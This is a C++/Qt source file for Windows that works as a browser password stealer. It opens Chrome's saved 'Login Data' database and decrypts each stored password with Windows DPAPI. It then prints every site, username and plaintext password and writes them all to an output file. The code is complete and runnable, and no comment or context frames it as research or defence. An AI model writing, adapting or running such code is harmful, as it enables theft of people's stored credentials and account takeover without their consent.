#include <iostream>
#include <QCoreApplication>
#include <QtSql/QSqlDatabase>
#include <QSqlQuery>
#include <QString>
#include <QDebug>
#include <QSqlError>
#include <QFile>

#include <windows.h>
//#include "dpapi.h"
//#include <wincrypt.h>

using namespace std;

int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);
    setlocale(LC_CTYPE, "rus");

    QString fileName;

    //Get command line arguments
    fileName = "output.txt";
    if (argc > 1) fileName = argv[1];

    //Output file
    QFile file(fileName);
    file.open(QIODevice::WriteOnly);

    //Connect to DB
    QSqlDatabase db;
    db = QSqlDatabase::addDatabase("QSQLITE");

    //Get %appdata% folder
    QString appdata = getenv("APPDATA");
    appdata.replace("\\", "/");

    //Destination folder
    db.setDatabaseName(appdata + "/../Local/Google/Chrome/User Data/Default/Login Data");
    db.open();


    if ( !db.isOpen() )
    {
        qDebug() << "Error\n";
    }
    else
    {
        //Create SQL Query; select url+login+pass
        QSqlQuery query;
        query.exec("SELECT origin_url, username_value, password_value FROM logins");

        while (query.next())
        {

            QString url = query.value(0).toString();
            QString user = query.value(1).toString();
            QByteArray pass = query.value(2).toByteArray();

            //Decrypt
            DATA_BLOB DataIn;
            DATA_BLOB DataOut;
            DATA_BLOB * pDataIn = &DataIn;
            DATA_BLOB * pDataOut = &DataOut;

            DataIn.pbData =  reinterpret_cast<byte *>( pass.data() );  //Pointer to data_input  BYTE*
            DataIn.cbData = pass.size();                               //Size of input string   DWORD

            if (CryptUnprotectData(     //Decryption function
                    pDataIn,
                    NULL,
                    NULL,               // Entropy
                    NULL,
                    NULL,
                    0,
                    pDataOut))
            {
                QString pass_decr;
                unsigned long pass_size  = static_cast<unsigned long>(DataOut.cbData);

                //Get pass string and cut it (pbData doesn't have '\0')
                pass_decr.append(reinterpret_cast<char *>(DataOut.pbData));
                pass_decr.resize(pass_size);

                qDebug().noquote() << endl << url << endl << "user = " << user << "\npass = " << pass_decr;

                //Stream for writing
                QTextStream stream(&file);
                stream << endl << url << "\r\nuser = " << user << "\r\npass = " << pass_decr << "\r\n\r\n";
            }
            else
            {
                qDebug() << "\nDecryption error!";
            }
        }
    }

    file.close();

    return a.exec();
}
